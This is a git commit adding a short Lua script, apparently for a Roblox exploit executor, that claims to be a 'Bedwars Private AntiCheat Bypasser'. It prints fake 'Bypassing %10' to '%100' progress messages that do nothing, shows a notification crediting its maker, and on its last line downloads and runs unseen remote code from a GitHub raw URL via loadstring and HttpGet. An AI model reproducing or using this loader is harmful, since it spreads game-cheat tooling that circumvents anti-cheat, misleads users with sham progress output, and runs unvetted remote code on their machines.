27ae3b45552a5ce614b631e14a8993770d03430c
llameiq <77410796+eLeCtRaDoMiNuS@users.noreply.github.com>
2022-08-02 03:17:40 -0700

    new.lua

---
+++ new.lua
@@ -0,0 +1,32 @@
+rconsolename("Bedwars Private AntiCheat Bypasser")
+
+
+rconsoleprint("\n")
+rconsoleprint("Cyber-Ware Private Bypasser")
+rconsoleprint("\n")
+
+rconsoleprint("\n")
+rconsoleprint("Bypassing %10")
+rconsoleprint("\n")
+rconsoleprint("Bypassing %20")
+rconsoleprint("\n")
+rconsoleprint("Bypassing %50")
+rconsoleprint("\n")
+rconsoleprint("Bypassing %75")
+rconsoleprint("\n")
+rconsoleprint("Bypassing %100")
+rconsoleprint("\n")
+
+
+rconsoleprint("Bypassed Succesfully!")
+rconsoleprint("\n")
+rconsoleprint("Made by npm#4947")
+rconsoleprint("\n")
+
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Cyber-Ware Private AC Disabler ";
+    Text = " Made by npm#4947"; -- what the text says (ofc)
+    Duration = 60;
+})
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eLeCtRaDoMiNuS/DenemeHeHe/main/ac.lua"))()
